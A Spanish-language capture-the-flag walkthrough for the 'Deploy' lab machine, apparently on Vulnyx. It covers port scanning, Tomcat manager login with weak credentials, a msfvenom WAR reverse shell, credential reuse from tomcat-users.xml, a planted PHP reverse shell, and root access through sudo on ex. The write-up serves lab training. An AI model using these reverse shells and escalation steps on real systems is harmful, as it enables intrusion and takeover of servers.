# Vulnyx Deploy Explotación

## Escaneo de Puertos
```bash
nmap -p 22,80,8080 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
# 22/tcp   abierto  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocolo 2.0)
# 80/tcp   abierto  http    Apache httpd 2.4.56 ((Debian))
# 8080/tcp abierto  http    Apache Tomcat
```

## Fuzzing en Tomcat
```bash
gobuster dir -u http://(IP-victima):8080 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
# /manager
```

## Explotación de Tomcat
Encontradas credenciales de inicio de sesión de Tomcat Manager, al colocar un usuario y luego darle a "cancel":
- Usuario: tomcat
- Contraseña: s****t
# esto es una vulnerabilidad comun en Tomcat

Dentro de Tomcat ubimos un archivo .war malicioso para obtener una shell inversa creada con msfvenom:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP-atacante) LPORT=443 -f war > reverse.war
```

Accedido a la shell inversa a través de Netcat en el puerto 443 con el usuario "tomcat".

## Tratamiento de TTY
```bash
script /dev/null -c bash
# (Ctrl + Z)
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHEL=bash
```

## Escalada de Usuario
Encontradas credenciales adicionales para el usuario "sa" en "tomcat-users.xml":
```xml
<user username="sa" password="s*******!" roles="manager-gui"/>
```

Accedido via SSH con el usuario "sa":
```bash
ssh sa@(IP-victima)
# Contraseña: s*******!
```

## Escalada de Privilegios
Investigado procesos en ejecución con `ps aux`. Identificado que el usuario "toor" está iniciando Apache continuamente.

```bash
ps aux | grep toor
```

Explorado el directorio Apache2 y creado un script de shell inversa en `/var/www/html`.

```bash
cd /var/www/html
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
nano php-pentest-monkey.php
```

Guardado el archivo como "index.php" y obtenida una shell inversa al acceder a la ruta raíz del servidor.

## Tratamiento de TTY (Nuevamente)
```bash
script /dev/null -c bash
# (Ctrl + Z)
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHEL=bash
```

## Escalada a Root
Ejecutado `sudo -l` y encontrado un comando interesante: `/usr/bin/ex`. Explotado para obtener una shell como root.

```bash
sudo -u root /usr/bin/ex
!/bin/sh
whoami
# root
```

¡Ahora somos root! :D
